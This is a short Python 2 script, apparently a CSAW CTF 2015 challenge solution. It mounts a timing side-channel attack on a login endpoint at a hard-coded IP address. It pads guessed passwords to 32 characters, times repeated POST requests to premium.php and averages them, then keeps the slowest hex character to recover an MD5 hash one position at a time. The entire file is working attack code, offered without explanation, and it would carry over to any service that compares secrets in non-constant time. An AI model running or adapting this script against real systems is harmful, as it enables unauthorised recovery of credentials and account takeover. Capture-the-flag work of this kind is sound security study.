#!/usr/bin/env python
#
# CSAWCTF 2015
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

import requests
import time

current_milli_time = lambda: int(round(time.time() * 1000))

def do_request(username, candidate):
	negative_response = "Not Authorized"
	url = "http://54.175.3.248:8089"

	# To make (strlen($pass) == strlen($hash))
	password = candidate + "0"*(32-len(candidate))

	payload = {'username': username, 'password': password}
	start_time = current_milli_time()
	r = requests.post(url + '/premium.php', data=payload)
	end_time = current_milli_time()
	if(negative_response in r.text):
		return False, (end_time - start_time)
	else:
		return True, r.text

username = "~~FLAG~~"
password = ""

round_delay = 300
n = 3
cumulative_delay = round_delay

charset = "0123456789abcdef"

# We are dealing with MD5 hashes to 32 characters
for i in xrange(32):
	# Bogus request to compensate for jitter
	do_request(username, "")

	candidate = ""
	max_delay = 0
	for c in charset:
		# determine average response time over n requests
		t_average = 0
		for j in xrange(n):
			r, t = do_request(username, password + c)
			
			if r:
				print "[+]Got hash [%s]!" % (password + c)
				print t
				exit()
			else:
				t_average += t

		t_average /= n

		print "[*][%s] -> %d ms (average)" % (password + c, t_average)

		if((t_average >= cumulative_delay) and (t_average > max_delay)):
			max_delay = t_average
			candidate = c

	if(candidate == ""):
		raise Exception("[-]Couldn't find candidate for position %d..." % i)

	print "[*]Candidate for pos %d: [%s]" % (i, candidate)
	password += candidate

	# Delay increases per index (since we iterate over string)
	cumulative_delay += round_delay